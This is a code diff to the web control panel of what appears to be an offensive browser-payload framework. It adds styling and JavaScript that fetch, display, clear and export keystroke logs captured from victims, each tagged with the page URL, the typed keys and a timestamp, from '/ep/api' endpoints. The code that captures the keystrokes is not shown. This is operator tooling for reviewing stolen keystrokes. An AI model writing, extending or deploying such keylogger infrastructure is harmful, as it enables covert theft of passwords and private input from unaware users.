@@ -438,6 +438,38 @@
         font-size: 0.8em;
         margin-top: 8px;
     }
+
+    .keylogger-list {
+        margin-top: 20px;
+    }
+
+    .keylog-entry {
+        background: #2a2a2a;
+        padding: 15px;
+        margin: 10px 0;
+        border-radius: 5px;
+    }
+
+    .keylog-url {
+        color: #c50f1f;
+        font-size: 0.9em;
+        margin-bottom: 8px;
+    }
+
+    .keylog-data {
+        background: #1a1a1a;
+        padding: 10px;
+        border-radius: 4px;
+        font-family: monospace;
+        white-space: pre-wrap;
+        word-break: break-all;
+    }
+
+    .keylog-time {
+        color: #666;
+        font-size: 0.8em;
+        margin-top: 8px;
+    }
     </style>
 </head>
 <body>
@@ -537,9 +569,7 @@
             <button onclick="clearKeylogger()" class="action-button">Clear Logs</button>
             <button onclick="exportKeylogger()" class="action-button">Export Logs</button>
         </div>
-        <div class="keylogger-entries">
-            <div id="keylogger-list"></div>
-        </div>
+        <div id="keylogger-list" class="keylogger-list"></div>
     </div>
 </div>
 
@@ -994,6 +1024,47 @@
         if (PayloadManager.config[payloadName]) {
             PayloadManager.payloads[payloadName]();
         }
+    }
+
+    function updateKeylogger() {
+        fetch('/ep/api/getKeylog')
+            .then(response => response.json())
+            .then(logs => {
+                const keyloggerList = document.getElementById('keylogger-list');
+                keyloggerList.innerHTML = '';
+                
+                logs.reverse().forEach(log => {
+                    const entry = document.createElement('div');
+                    entry.className = 'keylog-entry';
+                    entry.innerHTML = `
+                        <div class="keylog-url">${log.url}</div>
+                        <div class="keylog-data">${log.keys}</div>
+                        <div class="keylog-time">${new Date(log.timestamp).toLocaleString()}</div>
+                    `;
+                    keyloggerList.appendChild(entry);
+                });
+            });
+    }
+
+    function clearKeylogger() {
+        fetch('/ep/api/clearKeylog', { method: 'POST' })
+            .then(() => updateKeylogger());
+    }
+
+    function exportKeylogger() {
+        fetch('/ep/api/getKeylog')
+            .then(response => response.json())
+            .then(logs => {
+                const blob = new Blob([JSON.stringify(logs, null, 2)], { type: 'application/json' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'keylogger-data.json';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+            });
     }
 
     // Initialize
